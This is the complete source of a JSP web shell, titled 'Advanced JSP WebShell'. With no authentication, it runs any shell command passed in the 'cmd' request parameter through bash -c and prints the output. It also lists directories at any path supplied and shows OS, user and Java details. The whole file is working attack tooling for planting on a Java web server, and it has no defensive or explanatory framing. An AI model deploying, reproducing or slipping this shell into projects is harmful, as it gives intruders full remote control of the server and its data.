<%@ page import="java.util.*,java.io.*,java.nio.file.*" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%
// Full Featured JSP WebShell
String action = request.getParameter("action") != null ? request.getParameter("action") : "cmd";
String currentDir = System.getProperty("user.dir");
String userHome = System.getProperty("user.home");

if("cmd".equals(action) && request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    try {
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
        BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader stderr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        
        out.println("<h3>Command: " + cmd + "</h3>");
        out.println("<h4>Output:</h4><pre>");
        String line;
        while ((line = stdout.readLine()) != null) out.println(line);
        out.println("</pre>");
        
        out.println("<h4>Errors:</h4><pre>");
        while ((line = stderr.readLine()) != null) out.println(line);
        out.println("</pre>");
        
    } catch(Exception e) {
        out.println("<p style='color:red'>Error: " + e.getMessage() + "</p>");
    }
} else if("browse".equals(action)) {
    String path = request.getParameter("path") != null ? request.getParameter("path") : currentDir;
    try {
        File dir = new File(path);
        out.println("<h3>Directory: " + dir.getAbsolutePath() + "</h3>");
        out.println("<table border='1'><tr><th>Name</th><th>Size</th><th>Modified</th><th>Permissions</th></tr>");
        
        for(File file : dir.listFiles()) {
            out.println("<tr>");
            out.println("<td>" + (file.isDirectory() ? "[DIR] " : "") + file.getName() + "</td>");
            out.println("<td>" + (file.isFile() ? file.length() + " bytes" : "-") + "</td>");
            out.println("<td>" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified())) + "</td>");
            out.println("<td>" + (file.canRead() ? "r" : "-") + (file.canWrite() ? "w" : "-") + (file.canExecute() ? "x" : "-") + "</td>");
            out.println("</tr>");
        }
        out.println("</table>");
    } catch(Exception e) {
        out.println("<p style='color:red'>Error browsing: " + e.getMessage() + "</p>");
    }
}
%>
<html>
<head>
    <title>Advanced JSP WebShell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .tab { margin-bottom: 20px; }
        .tab button { padding: 10px 20px; margin-right: 5px; }
        .tabcontent { display: none; padding: 20px; border: 1px solid #ccc; }
        pre { background: #f4f4f4; padding: 10px; overflow: auto; }
    </style>
</head>
<body>
    <h1>JSP WebShell</h1>
    
    <div class="tab">
        <button onclick="openTab('cmd')">Command Execution</button>
        <button onclick="openTab('browse')">File Browser</button>
        <button onclick="openTab('info')">System Info</button>
    </div>

    <div id="cmd" class="tabcontent">
        <h2>Command Execution</h2>
        <form method="get">
            <input type="hidden" name="action" value="cmd">
            <textarea name="cmd" rows="3" cols="80" placeholder="Enter command..."><%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "whoami; pwd; ls -la" %></textarea><br>
            <input type="submit" value="Execute">
        </form>
    </div>

    <div id="browse" class="tabcontent">
        <h2>File Browser</h2>
        <form method="get">
            <input type="hidden" name="action" value="browse">
            Path: <input type="text" name="path" size="60" value="<%= request.getParameter("path") != null ? request.getParameter("path") : currentDir %>">
            <input type="submit" value="Browse">
        </form>
    </div>

    <div id="info" class="tabcontent">
        <h2>System Information</h2>
        <pre>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %>
Arch: <%= System.getProperty("os.arch") %>
User: <%= System.getProperty("user.name") %>
Home: <%= userHome %>
Current Dir: <%= currentDir %>
Java: <%= System.getProperty("java.version") %>
        </pre>
    </div>

    <script>
        function openTab(tabName) {
            var i, tabcontent;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            document.getElementById(tabName).style.display = "block";
        }
        document.getElementById('cmd').style.display = 'block';
    </script>
</body>
</html>
